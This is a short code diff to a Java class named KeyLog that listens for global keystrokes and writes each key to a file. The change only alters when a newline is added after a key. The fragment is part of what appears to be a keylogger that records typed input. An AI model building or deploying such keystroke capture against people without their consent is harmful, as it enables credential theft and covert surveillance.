@@ -60,7 +60,7 @@ public class KeyLog implements NativeKeyListener{
 		String keyPressed = NativeKeyEvent.getKeyText(arg0.getKeyCode());
 		
 			try {
-				if(keyPressed.length()>1 || keyPressed.equals(NativeKeyEvent.VC_ENTER)) {
+				if(keyPressed.length()>1 || keyPressed.equals("\n")) {
 					keyPressed=keyPressed+"\n";
 				}
 				fileOutStream.write(keyPressed);
